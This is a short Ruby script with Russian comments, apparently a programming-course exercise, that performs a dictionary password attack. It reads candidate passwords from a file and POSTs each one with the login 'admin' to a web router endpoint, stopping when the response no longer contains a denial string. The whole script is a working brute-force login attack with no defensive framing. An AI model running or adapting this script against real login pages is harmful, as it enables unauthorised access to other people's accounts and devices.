# coding: utf-8
# 
# Подбор пароля               (Сделано с листинга ЖУРАВЛЯ)  
# Отправка POST-запроса

require 'net/http'  
require 'uri'

def is_wrong_password? password_
    uri_ = URI.parse 'http://rubyschool.ru/router'
    response = Net::HTTP.post_form(uri_, :login => 'admin', 
                                         :password => password_).body
    response.include? "deniet"
end

input = File.open "password.txt", "r"

while (line = input.gets)
    line.chomp!
    print "Trying password #{line} ... "   
 
    if is_wrong_password? line
        puts "no...."
    else
        puts "Found!"
        input.close
        exit
    end
end
